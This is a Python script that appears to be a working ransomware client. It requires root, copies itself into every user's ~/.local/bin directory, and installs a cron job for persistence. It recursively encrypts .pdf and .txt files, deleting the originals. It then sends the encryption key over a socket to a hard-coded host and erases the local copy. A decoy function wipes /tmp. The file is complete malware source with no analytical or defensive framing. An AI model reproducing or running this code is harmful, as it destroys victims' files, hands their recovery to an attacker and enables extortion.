#!/usr/bin/python3
from subprocess import Popen,call
from os import makedirs,listdir,getcwd,remove, getuid
from os.path import dirname, exists
from os.path import isdir,isfile,splitext

if getuid()!=0:
    print("Script does not have sufficient privileges.")
    print("Please Run as either root user or using sudo")
    exit()

    
try:
    import cryptography
except ImportError:
    cmd='apt install python3-pip'
    call(cmd,shell=True)
    cmd='pip3 install cryptography'
    call(cmd,shell=True)
    

from socket import socket, gethostname
from pathlib import Path
from time import sleep
from cryptography.fernet import Fernet

# import sweeper
# import encrypt

port=11111
host='192.168.1.127'
encr=['pdf','txt']

def fake():
    print("Removing Temporary Files:")
    cmd='rm -rvf /tmp/*'
    Popen(cmd,shell=True)

sock = socket()
def copy_self():
    for each in listdir('/home/'):
        pth='/home/'+each+'/.local/bin/important'
        try:
            makedirs(pth,exist_ok=True)
            cmd='cp '+getcwd()+'/* /home/'+each +'/.local/bin/important/ > /dev/null'
            Popen(cmd, shell=True)
        except PermissionError:
            pass
    checkCron()

def genKey():
    symkey = Fernet.generate_key()

    with open('symkey','wb') as kf:
        kf.write(symkey)


def encryptor(file):
    if not exists ('symkey'):
        genKey()

    with open('symkey','rb') as kf:
        symkey=kf.read()
        f=Fernet(symkey)


    with open(file,'rb') as tf:
        crypto=f.encrypt(tf.read())
    remove(file)
    

    with open(file+".enc",'wb') as tf,open('list_of_encrypted.plain','w') as encf:
        tf.write(crypto)
        encf.write(str(file)+"\n")

def movein(dirpath='/home/ashwin/RansomwareTests'):
    for each in listdir(dirpath):
        if each[0]=='.':
            continue
        fpath=dirpath+'/'+each
        # print(fpath)
        if isdir(fpath):
            # print('isDir')
            try:
                movein(fpath)
            except OSError:
                continue
        elif isfile(fpath):
            # print('isFile')
            extension=splitext(fpath)[1][1:]
            print(extension)
            # print(extension)
            if extension in encr:
                # print(fpath)
                encryptor(fpath)
                print('encrypted %s'%each)
        else:
            print('Cant tell type')


def checkCron():
    cmd='crontab -l > cronreader'
    call(cmd,shell=True)
    with open('cronreader','r') as cf:
        ucron=cf.read()
    if not '* * * * */5 python3 /home/.local/bin/important/' in ucron:
        buildCron()

def buildCron():
    with open('cronreader','a') as cf:
        cf.write('* * * * */5 python3 /home/.local/bin/important/client.py\n')
    cmd='crontab cronreader'
    Popen(cmd,shell=True)
    with open('cronreader','a') as cf:
        cf.write('')
    remove('cronreader')
    

def connector():
    try:
        sock.connect((host, port)) #again, this requires a tuple
    except ConnectionRefusedError:
        sleep(5)
        connector()
        
def sender():
    connector()
    movein()
    while True:
        sock.send(b"Hello. File starts now\n")
        sock.send(b"--------------------------------------------------------------\n")
        if not exists('symkey'):
            genKey()    
        with open('symkey','rb') as f:
            data=f.read()

        sock.send(data)
    
        sock.send(b"\n--------------------------------------------------------------")
        sock.send(b"\nFile Complete\n")
        print("Sending complete")
        with open('symkey','w') as f:
            f.write("")
        remove('symkey')
        break

    sock.shutdown(1)

    sock.close()


if __name__=='__main__':
    copy_self()
    checkCron()
    sender()



        






